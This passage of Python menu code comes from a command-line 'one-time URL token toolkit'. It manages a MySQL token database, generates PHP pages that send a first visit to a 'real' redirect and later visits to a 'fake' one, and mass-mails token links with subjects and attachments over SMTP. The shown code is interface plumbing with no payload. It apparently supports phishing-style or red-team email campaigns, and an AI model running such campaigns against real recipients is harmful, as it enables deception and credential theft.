            self.otu_email = value
        elif variable == 'expires':
            if value == '1':
                self.expire = 2592000
            elif value == '2':
                self.expire = 604800
            elif value == '3':
                self.expire = 86400
            else:
                self.expire = int(value)
        elif variable == 'redirect_real':
            self.redir_one = value
        elif variable == 'redirect_tokennotset':
            self.no_tokenpage = value
        elif variable == 'redirect_fake':
            self.redir_two = value
        elif variable == 'n_time_execution':
            if value == '1':
                self.times = 1
            elif value == '2':
                self.times = 2
            elif value == '3':
                self.times = 3
            else:
                self.times = 1
        elif variable == 'email_file':
            self.emails = value
        elif variable == 'user_file':
            self.usersfile = value
        elif variable == 'url_param':
            self.urlparam = value
        elif variable == 'message_file':
            self.message_file = value
        elif variable == 'subject_header':
            self.subject = value
        elif variable == 'smtp_sender_email':
            self.addr_from = value
        elif variable == 'smtp_password':
            self.smtp_pass = value
        elif variable == 'url':
            self.URL = value
        elif variable == 'smtp_server':
            if value == '1':
                self.smtp_server = 'smtp.office365.com'
            elif value == '2':
                self.smtp_server = 'smtp.mail.yahoo.com'
            elif value == '3':
                self.smtp_server = 'smtp.gmail.com'
            else:
                self.smtp_server = value
        elif variable == 'smtp_port':
            self.smtp_port = value
        elif variable == 'attachment':
            if value == "":
                self.attachment = None
            else:
                self.attachment = value
        elif variable == 'google_api':
            self.google_api = value
        elif variable == 'token_file':
            self.token_file = value
        elif variable == 'send_ids':
            if value == "all":
                dbaction = mysqldbcreation(self.username, self.password, self.dbname, None)
                rowcount = dbaction.getrowcount()
                if rowcount == 1:
                    self.sendids = "1"
                else:
                    self.sendids = "1-" + str(rowcount)
            else:
                self.sendids = value
        else:
            print("Invalid variable name, please try again.\n")
        self.initialize_menu()
        self.currmenu()

    def set_readline(self):
        if self.currmenu == self.main_menu:
            comp = Completer(self.curractions.keys(), None)
        else:
            comp = Completer(self.curractions.keys(), self.currvars['variables'].keys())
        readline.set_completer_delims(' \t\n;')
        readline.parse_and_bind("tab: complete")
        readline.set_completer(comp.complete)

    # =======================
    #     MENUS FUNCTIONS
    # =======================

    # Main menu
    def banner_text(self):
        os.system('clear')

        print("""
    _______________________ ___         __________.____     __________
    \_____  \__    ___/    |   \        \______   \    |    \____    /
     /   |   \|    |  |    |   /  ______ |     ___/    |      /     / 
    /    |    \    |  |    |  /  /_____/ |    |   |    |___  /     /_ 
    \_______  /____|  |______/           |____|   |_______ \/_______ |
            \/                                            \/        \/
    """)
        print("One-time URL token toolkit\n")
        print("If this is the first time running this script, it is recommended to choose option 1 before getting "
               "started.")
        print("Type info or show options or show or something to view variables in each menu")
        print("Type 'back' or 'home' to return to the main menu")
        print("Type 'set <variable name> <input>' to set variables")
        print("Type 'execute' or 'run' to execute current module with current variables\n")
        print("Please choose from the options below:")
        print("1)\t MySQL database setup")
        print("2)\t One-time URL generation")
        print("3)\t PHP code generation")
        print("4)\t Display current OTU database")
        print("5)\t Export current OTU database to CSV")
        print("6)\t Sendmail OTU database uploader")
        print("7)\t Sendmail with OTU")
        print("911)\t Nuke OTU database and reset MySQL configuration changes")
        print("\n0) Quit")
        self.main_menu()

        return

    def main_menu(self):
        self.currmenu = self.main_menu
        self.curractions = self.mainmenu_actions
        self.set_readline()
        choice = input("[otu-plz] >> ")
        self.exec_menu(choice)

    # Execute menu
    def exec_menu(self, choice):
        # os.system('clear')
        ch = choice.lower()
        ch = ch.split()[0]
        if ch == 'set':
            self.currset = choice
        try:
            self.curractions[ch]()
        except KeyError:
            print ("Invalid selection, please try again.\n")
            self.curractions['main_menu']()
        return

    def mysqlsetupmenu(self):
        self.currmenu = self.mysqlsetupmenu
        self.currvars = self.mysqlsetup_vars
        self.module_exec = self.mysqlexec
        self.initialize_menu()
        self.set_readline()
        choice = input("[otu-db-creation] >> ")
        self.exec_menu(choice)
        return

    def mysqlexec(self):
        try:
            dbaction = mysqldbcreation(self.username, self.password, self.dbname, None)
            dbaction.networkcheck()
            dbaction.runcheck()
            dbaction.dbcheck()
            dbaction.dbusercheck()
            dbaction.dbuserpermcheck()
            dbaction.tablecheck()
            dbaction.displaydb()
        except TypeError:
            print("[!] Invalid username and/or password was used for MySQL database.")
        finally:
            self.currmenu()

        return

    def otugenerationmenu(self):
        self.currmenu = self.otugenerationmenu
        self.currvars = self.otugeneration_vars
        self.module_exec = self.otugenexec
        self.initialize_menu()
        self.set_readline()
        choice = input("[otu-generation] >> ")
        self.exec_menu(choice)
        return

    def otugenexec(self):
        try:
            dbaction = mysqldbcreation(self.username, self.password, self.dbname, None)
            rowcount = dbaction.getrowcount() + 1
            otugenerator = OTU(rowcount, self.username, self.password, self.dbname, self.otu_user, self.otu_email)
            otugenerator.generate()
            otugenerator.dbinsert()
            otugenerator.displayURL()
        except TypeError:
            print("[!] Invalid username and/or password was used for MySQL database.")
        except MySQLdb.Error:
            print("[!] Invalid database, the dbname '%s' does not exist." % self.dbname)
        finally:
            self.currmenu()

        return

    def test(self):
        print("go away plz.")

    def phpgenerationmenu(self):
        self.currmenu = self.phpgenerationmenu
        self.currvars = self.phpgeneration_vars
        self.module_exec = self.phpgenexec
        self.initialize_menu()
        self.set_readline()
        choice = input("[otu-php-generation] >> ")
        self.exec_menu(choice)
        return

    def phpgenexec(self):
        try:
            otphj = OTUPHP(self.username, self.password, self.dbname, self.expire, self.redir_one, self.redir_two, self.times - 1, self.php_filename, self.urlparam, self.no_tokenpage)
            otphj.generate()
            otphj.writetofile()
        except TypeError:
            print("[!] Something is fucked.")
        finally:
            self.currmenu()

        return

    def displaydbmenu(self):
        self.currmenu = self.displaydbmenu
        self.currvars = self.mysqldisplay_vars
        self.module_exec = self.displaydbexec
        self.initialize_menu()
        self.set_readline()
        choice = input("[otu-db-display] >> ")
        self.exec_menu(choice)
        return

    def displaydbexec(self):
        try:
            dbaction = mysqldbcreation(self.username, self.password, self.dbname, None)
            dbaction.displaydb()
        except TypeError:
            print("[!] Invalid username and/or password was used for MySQL database.")
        except MySQLdb.Error:
            print("[!] Invalid database, the dbname '%s' does not exist." % self.dbname)
        finally:
            self.currmenu()

        return

    def exportdbmenu(self):
        self.currmenu = self.exportdbmenu
        self.currvars = self.mysqlexport_vars
        self.module_exec = self.exportdbexec
        self.initialize_menu()
        self.set_readline()
        choice = input("[otu-db-export] >> ")
        self.exec_menu(choice)
        return

    def exportdbexec(self):
        try:
            dbaction = mysqldbcreation(self.username, self.password, self.dbname, self.csv_filename)
            dbaction.exportdb()
        except TypeError:
            print("[!] Invalid username and/or password was used for MySQL database.")
        except MySQLdb.Error:
            print("[!] Invalid database, the dbname '%s' does not exist." % self.dbname)
        finally:
            self.currmenu()

        return

    def nukedb(self):
        self.currmenu = self.nukedb
        self.currvars = self.mysqlnuke_vars
        self.module_exec = self.nukedbexec
        self.initialize_menu()
        self.set_readline()
        choice = input("[otu-nuke] >> ")
        if choice.lower() == 'run' or choice.lower() == 'execute':
            print("Are you sure you want to completely delete your token database? [y/N]")
            answer = input("[otu-nuke] >> ")
            if answer.lower() == 'no' or answer.lower() == 'n' or answer.lower() == '':
                self.main_menu()
        self.exec_menu(choice)
        return

    def nukedbexec(self):
        try:
            dbaction = mysqldbcreation(self.username, self.password, self.dbname, None)
            dbaction.clearall()
        except TypeError:
            print("[!] Invalid username and/or password was used for MySQL database.")
        except MySQLdb.Error:
            print("[!] Invalid database, the dbname '%s' does not exist." % self.dbname)
        finally:
            self.currmenu()

        return

    def sendmailuploadmenu(self):
        self.currmenu = self.sendmailuploadmenu
        self.currvars = self.sendmailtokengenerator_vars
        self.module_exec = self.sendmailupload
        self.initialize_menu()
        self.set_readline()
        choice = input("[otu-sendmail-generation] >> ")
        self.exec_menu(choice)
        return

    def sendmailupload(self):
        try:
            sendotugenerator = sendmailuploader(self.username, self.password, self.dbname, self.emails, self.usersfile)
            sendotugenerator.checks()
            sendotugenerator.upload()
        except TypeError:
            print("[!] Invalid username and/or password was used for MySQL database.")
        except MySQLdb.Error:
            print("[!] Invalid database, the dbname '%s' does not exist." % self.dbname)
        finally:
            self.currmenu()

        return

    def sendmailmenu(self):
        self.currmenu = self.sendmailmenu
        self.currvars = self.sendmail_vars
        self.module_exec = self.sendmailexec
        self.initialize_menu()
        self.set_readline()
        choice = input("[otu-sendmail] >> ")
        self.exec_menu(choice)
        return

    def sendmailexec(self):
        try:
            sendmailotu = Sendmail(self.username, self.password, self.dbname, self.sendids, self.addr_from, self.smtp_pass, self.subject, self.smtp_server, self.smtp_port, self.message_file, self.URL, self.urlparam, self.attachment, self.google_api, self.token_file)
            sendmailotu.check()
            sendmailotu.executesend()
        except TypeError:
            print("[!] Invalid username and/or password was used for MySQL database.")
            traceback.print_exc()
        except MySQLdb.Error:
            print("[!] Invalid database, the dbname '%s' does not exist." % self.dbname)
        finally:
            self.currmenu()

        return

    # Back to main menu
    def back(self):
        self.mainmenu_actions['main_prompt']()

    # Exit program
    def exit(self):
        os.system('clear')
        sys.exit()

# =======================
#      MAIN PROGRAM
# =======================

# Main Program
if __name__ == "__main__":
    # Launch main menu
    try:
        Menu()
    except KeyboardInterrupt:
        print("gg")
        sys.exit()
